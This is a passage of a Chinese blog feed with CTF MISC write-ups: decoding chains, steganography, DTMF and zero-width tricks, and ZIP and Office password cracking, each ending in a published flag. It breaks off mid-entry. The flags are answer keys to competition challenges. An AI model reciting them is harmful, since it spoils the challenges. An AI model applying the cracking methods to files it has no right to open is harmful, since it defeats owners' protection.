&lt;h4&gt;&lt;span id=&quot;2021年春秋杯新年欢乐赛十二宫的挑衅&quot;&gt;2021年“春秋杯”新年欢乐赛【十二宫的挑衅】&lt;/s</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-2</title>
    <link href="http://mklkx.github.io/2021/01/16/MISC-2/"/>
    <id>http://mklkx.github.io/2021/01/16/MISC-2/</id>
    <published>2021-01-16T03:59:00.000Z</published>
    <updated>2021-05-04T11:38:54.804Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="simple">simple</span></h2><hr><h3><span id="21">21</span></h3><h4><span id="rctf2019draw"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>长见识了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home</span><br></pre></td></tr></table></figure><p><a href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a></p><p>通过这个网站能得到画出来的LOGO</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RCTF_HeyLogo</span><br></pre></td></tr></table></figure><h3><span id="22">22</span></h3><h4><span id="mrctf2020不眠之夜"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。感谢天璇战队供题。天璇战队平台：<a href="http://ctf.merak.codes/">http://ctf.merak.codes/</a></p></blockquote><p>人傻了</p><p><img src="pintu.jpg" alt="pintu"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MRCTF&#123;Why_4re_U_5o_ShuL1an??&#125;</span><br></pre></td></tr></table></figure><h3><span id="23">23</span></h3><h4><span id="xman2018排位赛通行证"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。来源：<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2018">https://github.com/hebtuerror404/CTF_competition_warehouse_2018</a></p></blockquote><p>常规解码</p><p>题目内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kanbbrgghjl&#123;zb____&#125;vtlaln</span><br></pre></td></tr></table></figure><p>栅栏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kzna&#123;blnl_abj_lbh_trg_vg&#125;</span><br></pre></td></tr></table></figure><p>凯撒</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xman&#123;oyay_now_you_get_it&#125;</span><br></pre></td></tr></table></figure><h3><span id="24">24</span></h3><h4><span id="安洵杯-2019easy-misc"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到一张图【小姐姐.png】，一个加密压缩包【decode.zip】，一个文件夹【read】</p><p>【read】里为哈利波特的英文，猜测可能是词频统计</p><p>【decode.zip】有提示，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,</span><br></pre></td></tr></table></figure><p>计算得该式子为7，尝试压缩包密码【7NNULLULL,】不对，尝试掩码攻击，得到密码【2019456NULLULL,】(一开始没有加逗号人都傻了)</p><p>得到一串替换密码</p><p>接下来分析图片</p><p>foremost分离出一张一样的图片，对比无果，尝试盲水印攻击，得到一张图片，提示下一步应该对11.txt操作</p><p>对11.txt进行词频统计</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import Counter</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;file.txt&quot;)</span><br><span class="line">txt &#x3D; f.read()</span><br><span class="line">c &#x3D; Counter()</span><br><span class="line">for i in txt:</span><br><span class="line">    c[i] &#x3D; c[i]+1</span><br><span class="line">print(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Counter(&#123;&#39; &#39;: 75435, &#39;e&#39;: 39628, &#39;t&#39;: 27993, &#39;a&#39;: 25887, &#39;o&#39;: 25809, &#39;n&#39;: 21337, &#39;r&#39;: 20990, &#39;h&#39;: 19535, &#39;i&#39;: 19422, &#39;s&#39;: 18870, &#39;d&#39;: 15932, &#39;l&#39;: 14385, &#39;\x80&#39;: 12130, &#39;u&#39;: 9562, &#39;y&#39;: 8293, &#39;g&#39;: 8127, &#39;w&#39;: 7744, &#39;m&#39;: 6729, &#39;f&#39;: 6431, &#39;c&#39;: 6403, &#39;.&#39;: 6136, &#39;\xe3&#39;: 6065, &#39;,&#39;: 5658, &#39;b&#39;: 4980, &#39;p&#39;: 4909, &#39;&quot;&#39;: 4758, &#39;k&#39;: 3930, &quot;&#39;&quot;: 3141, &#39;\n&#39;: 3033, &#39;H&#39;: 2996, &#39;v&#39;: 2716, &#39;-&#39;: 1990, &#39;I&#39;: 1393, &#39;T&#39;: 1055, &#39;S&#39;: 844, &#39;?&#39;: 754, &#39;A&#39;: 703, &#39;D&#39;: 685, &#39;M&#39;: 665, &#39;R&#39;: 660, &#39;W&#39;: 653, &#39;P&#39;: 639, &#39;G&#39;: 492, &#39;N&#39;: 488, &#39;!&#39;: 474, &#39;F&#39;: 426, &#39;x&#39;: 381, &#39;B&#39;: 348, &#39;O&#39;: 332, &#39;Y&#39;: 326, &#39;j&#39;: 319, &#39;C&#39;: 293, &#39;E&#39;: 287, &#39;z&#39;: 259, &#39;q&#39;: 217, &#39;L&#39;: 209, &#39;Q&#39;: 203, &#39;U&#39;: 193, &#39;V&#39;: 192, &#39;;&#39;: 135, &#39;K&#39;: 79, &#39;:&#39;: 69, &#39;J&#39;: 51, &#39;)&#39;: 33, &#39;(&#39;: 30, &#39;1&#39;: 11, &#39;3&#39;: 8, &#39;4&#39;: 6, &#39;0&#39;: 5, &#39;Z&#39;: 5, &#39;7&#39;: 4, &#39;9&#39;: 4, &#39;2&#39;: 3, &#39;*&#39;: 2, &#39;5&#39;: 2, &#39;X&#39;: 2, &#39;\t&#39;: 1, &#39;6&#39;: 1, &#39;8&#39;: 1, &#39;\\&#39;: 1, &#39;~&#39;: 1&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于decode.txt只对小写字母操作，进行排序</p><p>etaonrhisdluygwmfcbpkvz</p><p>注：以下操作为WP内容，非笔者本人（笔者本人运行不出“正确”结果，持保留意见</p><p>对照decode.txt得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms</span><br></pre></td></tr></table></figure><p>base85</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;have_a_good_day1&#125;</span><br></pre></td></tr></table></figure><h3><span id="25">25</span></h3><h4><span id="mrctf2020unravel"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。感谢天璇战队供题。天璇战队平台：<a href="http://ctf.merak.codes/">http://ctf.merak.codes/</a></p></blockquote><p>这道题算是杂糅在一起，不过并不难</p><p>得到【JM.png】【Look_at_the_file_ending.wav】【win-win.zip】</p><p>提示得这么明显了，查看音频末尾，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;nSQN+hoHL8OwV9iJB&#x2F;mSdKk5dmusulz4&#x3D;</span><br></pre></td></tr></table></figure><p>以为是3DES，需要密钥</p><p>分离JM.png</p><p>得到压缩包，名为AES的Tokyo图片</p><p>至此，加密方式，密钥都是已知的。</p><p>开干叭</p><p>AES解密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CCGandGulu</span><br></pre></td></tr></table></figure><p>解开加密压缩包</p><p>得到Ending.wav</p><p>这里用到一个多媒体隐写工具SlientEye</p><p>decode得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MRCTF&#123;Th1s_is_the_3nd1n9&#125;</span><br></pre></td></tr></table></figure><h3><span id="26">26</span></h3><h4><span id="gkctf2020code-obfuscation"></span></h4><blockquote><p>压缩包密码是加密过的</p></blockquote><p>得到一张扭曲的二维码，还原得</p><blockquote><p>天天PS我真是：）</p></blockquote><p><img src="QR.PNG" alt="QR"></p><p>扫码得【base（gkctf)】</p><p>根据提示，存在压缩包，对图片进行分离，果然得到了。</p><p>将明文通过base58加密后得到CfjxaPF，解开</p><p>得名为1的文件和flag3.png</p><p>图片不知道咋说啥，先处理1里的内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(function(p,a,c,k,e,d)&#123;e&#x3D;function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c&#x2F;a)))+((c&#x3D;c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(&#x2F;^&#x2F;,String))&#123;while(c--)d[e(c)]&#x3D;k[c]||e(c);k&#x3D;[function(e)&#123;return d[e]&#125;];e&#x3D;function()&#123;return&#39;\\w+&#39;&#125;;c&#x3D;1;&#125;;while(c--)if(k[c])p&#x3D;p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p;&#125;(&#39;15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17&#x3D;&quot;n&quot;12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17&#x3D;&quot;n&quot;12 13&#x3D;0 15 n 14 a b c d e f g h i j 10 11 16&#x3D;&quot;n&quot;13&#x3D;$((13+1))12 1g(&quot;1f&#x3D;\&#39; \&#39;;1e&#x3D;\&#39;&quot;\&#39;;16&#x3D;\&#39;#\&#39;;1j&#x3D;\&#39;(\&#39;;1i&#x3D;\&#39;)\&#39;;1h&#x3D;\&#39;.\&#39;;1a&#x3D;\&#39;;\&#39;;19&#x3D;\&#39;&lt;\&#39;;18&#x3D;\&#39;&gt;\&#39;;1d&#x3D;\&#39;1c\&#39;;1b&#x3D;\&#39;&#123;\&#39;;1k&#x3D;\&#39;&#125;\&#39;;1t&#x3D;\&#39;0\&#39;;1u&#x3D;\&#39;1\&#39;;1s&#x3D;\&#39;2\&#39;;1r&#x3D;\&#39;3\&#39;;1n&#x3D;\&#39;4\&#39;;1m&#x3D;\&#39;5\&#39;;1l&#x3D;\&#39;6\&#39;;1q&#x3D;\&#39;7\&#39;;1p&#x3D;\&#39;8\&#39;;1o&#x3D;\&#39;9\&#39;;&quot;)&#39;,62,93,&#39;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db&#39;.split(&#39;|&#39;),0,&#123;&#125;))</span><br></pre></td></tr></table></figure><p>js解密得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for n in a b c d e f g h i j k l m n o p q r s t u v w x y z do eval An &#x3D; &quot;n&quot;</span><br><span class="line">done</span><br><span class="line">for n in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z do eval An &#x3D; &quot;n&quot;</span><br><span class="line">done num &#x3D; 0</span><br><span class="line">for n in a b c d e f g h i j do eval Bn &#x3D; &quot;n&quot;</span><br><span class="line">num &#x3D; $((num + 1)) done alert(&quot;Bk&#x3D;&#39; &#39;;Bm&#x3D;&#39;&quot;&#39;;Bn&#x3D;&#39;</span><br><span class="line"># &#39;;Bs&#x3D;&#39; (&#39;;Bt&#x3D;&#39;)&#39;;By&#x3D;&#39;.&#39;;Cb&#x3D;&#39;;</span><br><span class="line">&#39;;Cc&#x3D;&#39; &lt; &#39;;Ce&#x3D;&#39; &gt; &#39;;Cl&#x3D;&#39;</span><br><span class="line">_ &#39;;Cn&#x3D;&#39; &#123;</span><br><span class="line">&#39;;Cp&#x3D;&#39;</span><br><span class="line">&#125;</span><br><span class="line">&#39;;Da&#x3D;&#39;</span><br><span class="line">0 &#39;;Db&#x3D;&#39;</span><br><span class="line">1 &#39;;Dc&#x3D;&#39;</span><br><span class="line">2 &#39;;Dd&#x3D;&#39;</span><br><span class="line">3 &#39;;De&#x3D;&#39;</span><br><span class="line">4 &#39;;Df&#x3D;&#39;</span><br><span class="line">5 &#39;;Dg&#x3D;&#39;</span><br><span class="line">6 &#39;;Dh&#x3D;&#39;</span><br><span class="line">7 &#39;;Di&#x3D;&#39;</span><br><span class="line">8 &#39;;Dj&#x3D;&#39;</span><br><span class="line">9 &#39;;&quot;)</span><br></pre></td></tr></table></figure><p>根据flag3.png对应得到Aa=a;Ab=b等Bk=’ ‘;Bm=’&quot;‘;Bn=’#‘等Cb=’;Cc='&lt;'等Da=‘0’;Db='1’等</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    print(&quot;w3lc0me_4o_9kct5&quot;);</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w3lc0me_4o_9kct5</span><br></pre></td></tr></table></figure><h3><span id="27">27</span></h3><h4><span id="utctf2020docx"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>打开看了一波，没啥发现。</p><p>docx常规做法，更改后缀为.zip</p><p>在/word/media中发现flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">utflag&#123;unz1p_3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure><blockquote><p>果然是unzip everything哈哈哈</p></blockquote><h3><span id="28">28</span></h3><h4><span id="派大星的烦恼"></span></h4><blockquote><p>派大星最近很苦恼，因为它的屁股上出现了一道疤痕！我们拍下了它屁股一张16位位图，0x22，0x44代表伤疤两种细胞，0xf0则是派大星的赘肉。还原伤疤，知道是谁打的派大星！(答案为32位的一串字符串) 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>给了一张粉色的图片，丢进010editor查看，根据提示，找到0x22,0x44的部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;DD&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;&quot;DD&quot;DD&quot;&quot;D&quot;&quot;DDD&quot;&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;D&quot;&quot;&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;&quot;</span><br></pre></td></tr></table></figure><p>两种编码，自然想到01转二维码</p><p>通过替换得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100</span><br></pre></td></tr></table></figure><p>转二维码无果</p><p>01还能想到二进制，但直接转二进制存在不可见字符。</p><p>想了好久，看了大佬博客才知道，此处应该将每八位二进制进行反转</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def bin_to_str(s):</span><br><span class="line">    return &#39;&#39;.join([chr(i) for i in [int(b, 2) for b in s.split(&#39; &#39;)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a &#x3D; &quot;01101100 00101100 00001100 01101100 10011100 10101100 00001100 10000110 10101100 00101100 10001100 00011100 00101100 01000110 00100110 10101100 01100110 10100110 01101100 01000110 01101100 10100110 10101100 01000110 00101100 11000110 10100110 00101100 11001100 00011100 11001100 01001100&quot;</span><br><span class="line">a &#x3D; a.split(&#39; &#39;)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in a:</span><br><span class="line">    test &#x3D; i[::-1]</span><br><span class="line">    flag +&#x3D; bin_to_str(test)</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6406950a54184bd5fe6b6e5b4ce43832</span><br></pre></td></tr></table></figure><blockquote><p>所以到底是谁打的派大星呢？可爱</p></blockquote><h3><span id="29">29</span></h3><h4><span id="gkctf2020harley-quinn"></span></h4><blockquote><p>Ivy给Harley发了一个短信……算了，编不下去了，先听后看就完事了……音频解码可能有误差，密码为有意义的无空格小写短句 解密版本为1.25</p></blockquote><blockquote><p>hint:电话音&amp;九宫格</p></blockquote><blockquote><p>FreeFileCamouflage，下载的文件可能显示乱码</p></blockquote><p>根据第一条提示，利用dtmf2num对Heathens.wav进行解码（先截取音频中电话音的部分</p><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- DTMF numbers:  #22283344477773338866#</span><br></pre></td></tr></table></figure><p>根据经验，九宫格解码得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfisfun</span><br></pre></td></tr></table></figure><p>其中需要自己手动调整部分内容，使其成为有意义的短句</p><p>第二步是下载FreeFileCamouflage，并按照要求输入密码和图片进行解密就好,得flag.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;</span><br></pre></td></tr></table></figure><h3><span id="30">30</span></h3><h4><span id="粽子的来历"></span></h4><blockquote><p>曹操的私生子曹小明因为爸爸活着的时候得罪太多人，怕死后被抄家，所以把财富保存在一个谁也不知道的地方。曹小明比较喜欢屈原，于是把地点藏在他的诗中。三千年后，小明破译了这个密码，然而却因为担心世界因此掀起战争又亲手封印了这个财富并仿造当年曹小明设下四个可疑文件，找到小明喜欢的DBAPP标记，重现战国辉煌。(答案为正确值(不包括数字之间的空格)的小写32位md5值) 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><blockquote><p>学到了学到了，word还能这样用（脑洞太大了叭</p></blockquote><p>附件得到四个损坏的word，丢进010editor，发现明显的错误</p><p><img src="word.PNG" alt="word"></p><p>将其修改为F即可正常打开</p><p>里面是屈原的诗。作为一个MISC手，应该看到行距的不同，查看【段落】可知道，有些是单倍行距，有些是1.5倍，进行01的转换</p><p>分别得到由四个word得到的四串数字。按题目要求进行md5加密就好啦</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">287b8ceed1c89f1eb1082b3076b7a321</span><br><span class="line">59f3bfe7c1e00ba34e4558cf295544bc</span><br><span class="line">d473ee3def34bd022f8e5233036b3345</span><br></pre></td></tr></table></figure><p>由于试到第三串的时候正确了，就没有再对D进行处理啦</p><h3><span id="31">31</span></h3><h4><span id="mrctf2020hello_-misc"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。感谢Galaxy师傅供题。</p></blockquote><p>真实脑洞题</p><p>前半部分还是常规操作</p><p>得到【flag.rar】【try to restore it.png】</p><p>对图片进行lsb解密，分别在red通道和blue通道看到东西</p><p>extract后，看到在red为0是藏有一张png</p><p>导出，得到</p><p><img src="swRGLD.png" alt="swRGLD"></p><p>是【flag.rar】的密码，看来还有压缩包</p><p>对图片查看二进制后，手动分离出一个压缩包，命名为【file.zip】叭</p><p>利用密码!@#$%67*()-+得到【out.txt】</p><p>内容为127，255，63等，类似之前做过的题</p><p>套用脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&quot;attachment.txt&quot;, &quot;r&quot;)</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line">tmp &#x3D; &#39;&#39;</span><br><span class="line">while 1:</span><br><span class="line">    num &#x3D; f.readline()</span><br><span class="line">    if not num:</span><br><span class="line">        break</span><br><span class="line">    if num.rstrip() &#x3D;&#x3D; &#39;63&#39;:</span><br><span class="line">        tmp &#x3D; &#39;00&#39;</span><br><span class="line">    elif num.rstrip() &#x3D;&#x3D; &#39;127&#39;:</span><br><span class="line">        tmp &#x3D; &#39;01&#39;</span><br><span class="line">    elif num.rstrip() &#x3D;&#x3D; &#39;191&#39;:</span><br><span class="line">        tmp &#x3D; &#39;10&#39;</span><br><span class="line">    elif num.rstrip() &#x3D;&#x3D; &#39;255&#39;:</span><br><span class="line">        tmp &#x3D; &#39;11&#39;</span><br><span class="line">    s +&#x3D; tmp</span><br><span class="line"></span><br><span class="line">print s</span><br><span class="line"></span><br><span class="line">number &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0, len(s), 8):</span><br><span class="line">    number +&#x3D; chr(int(s[i:i + 8], 2))</span><br><span class="line"></span><br><span class="line">print number</span><br><span class="line"></span><br><span class="line">f2 &#x3D; open(&#39;1.zip&#39;, &#39;w&#39;)</span><br><span class="line">f2.write(number.decode(&#39;hex&#39;))</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">f3 &#x3D; open(&#39;flag.txt&#39;, &#39;r&#39;)</span><br><span class="line">strs &#x3D; f3.readline()</span><br><span class="line">while 1:</span><br><span class="line">    strs &#x3D; base64.b64decode(strs)</span><br><span class="line">    print strs</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar-passwd:0ac1fe6b77be5dbe</span><br></pre></td></tr></table></figure><p>解开【flag.rar】</p><p>得到【fffflag.docx】，全选，上色，得到六行base64编码</p><p>按行解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">file_path &#x3D; &#39;b641.txt&#39;</span><br><span class="line">file &#x3D; open(&#39;b642.txt&#39;, &#39;wb&#39;)</span><br><span class="line">for line in open(file_path):</span><br><span class="line">    print(line)</span><br><span class="line">    b64line &#x3D; base64.b64decode(line)</span><br><span class="line">    file.write(b64line)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>得到(此处为第一行的结果)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">110110111111110011110111111111111111111111111111101110000001111111111001101</span><br></pre></td></tr></table></figure><p>接下来就是脑洞部分了，把1替换为.</p><p>得到</p><p><img src="swWAfI.jpg" alt="swWAfI"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">He1Lo_mi5c~</span><br></pre></td></tr></table></figure><h3><span id="32">32</span></h3><h4><span id="wustctf2020spaceclub"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。感谢 Iven Huang 师傅供题。比赛平台：<a href="https://ctfgame.w-ais.cn/">https://ctfgame.w-ais.cn/</a></p></blockquote><p>常规题。</p><p>得到一个看似空白的txt文件</p><p>全选能得到长短不一的空格。</p><p>1）长转【-】，短转【.】;由于没有断点，莫斯失败</p><p>2）长转【1】，短转【0】;二进制转ascii，无果</p><p>3）同2），二进制转字符串，得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</span><br></pre></td></tr></table></figure><h3><span id="33">33</span></h3><h4><span id="utctf2020file-header"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>啊这，这道题标准misc起手式，修改文件头得写有flag的图片</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">utflag&#123;3lit3_h4ck3r&#125;</span><br></pre></td></tr></table></figure><h3><span id="34">34</span></h3><h4><span id="hashcat"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>一道不算难的misc题</p><p>记得去年遇到过对ppt,word进行爆破的，但当时不知道怎么解。现在知道啦</p><p>得到一个无后缀名的文件，更改其为.ppt得到加密文件</p><p>Accent OFFICE Password Recovery(<a href="https://www.52pojie.cn/thread-82569-1-1.html">https://www.52pojie.cn/thread-82569-1-1.html</a>)</p><p>直接爆破得密码【9919】</p><p><img src="baopo.PNG" alt="baopo"></p><p>查看ppt内容，在第7页发现空白字符（被ppt自带的下划线暴露了,上色得flag）</p><p><img src="ppt.PNG" alt="ppt"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag&#123;okYOUWIN&#125;</span><br></pre></td></tr></table></figure><h3><span id="35">35</span></h3><h4><span id="ctf2019otaku"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>这道题也是长见识的</p><p>得到一个加密压缩包和一个word</p><p>word里有隐藏字符</p><p><img src="lastword.PNG" alt="lastword"></p><p>词:lastword</p><p>加密文件夹里有一个同名txt，考虑明文攻击</p><p>有一个问题，如何将word里的隐藏字符做成明文攻击的密钥呢？</p><p>1）选中隐藏字符，右键-&gt;字体-&gt;‘隐藏字符’取消打勾-&gt;复制</p><p>2）直接做成.txt的话没有gbk选项（其他都不行）</p><p>3）大佬做法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#encoding&#x3D;GBK</span><br><span class="line">f &#x3D; open(&quot;test.txt&quot;, &quot;w&quot;)</span><br><span class="line">s&#x3D;&quot;Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#39;t contact Violet now. She must be desperate to see me and I don&#39;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don&#39;t play the Hearthstone, and I don&#39;t even know what is Rastakhan&#39;s Rumble.&quot;</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>呱唧呱唧</p><p>接下来就是明文攻击了</p><p><img src="mingwen.PNG" alt="mingwen"></p><p>得到密钥【My_waifu】</p><p>解开压缩包</p><p>kali解压图片</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg flag.png</span><br></pre></td></tr></table></figure><p><img src="zsteg.PNG" alt="zsteg"></p><blockquote><p>zsteg安装方法</p></blockquote><p>麻麻我学会啦</p><p>艰辛安装过程从虚拟机连不上网开始</p><p>编辑-&gt;虚拟网络编辑器-&gt;还原默认设置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zed-0xff&#x2F;zsteg</span><br><span class="line">cd zsteg&#x2F;</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>安装好之后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg flag.png</span><br></pre></td></tr></table></figure><p>得到上述flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*ctf&#123;vI0l3t_Ev3rg@RdeN&#125;</span><br></pre></td></tr></table></figure><h3><span id="36">36</span></h3><h4><span id="utctf2020zero"></span></h4><blockquote><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote></blockquote><blockquote><p>学到了零宽度字符隐写https://330k.github.io/misc_tools/unicode_steganography.html</p></blockquote><p>死活看不出来有啥不对的，字频分析也不是。原来用上面的网站就可以啦，有收获一个新工具！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">utflag&#123;whyNOT@sc11_4927aajbqk14&#125;</span><br></pre></td></tr></table></figure><h3><span id="37">37</span></h3><h4><span id="mrctf2020pyflag"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。感谢天璇战队供题。天璇战队平台：<a href="http://ctf.merak.codes/">http://ctf.merak.codes/</a></p></blockquote><p>得到三张图片，查看二进制得到PK字样，但直接分离显示缺少文件尾，仔细观察</p><p>分别存在</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Secret File Part 1:]</span><br><span class="line">[Secret File Part 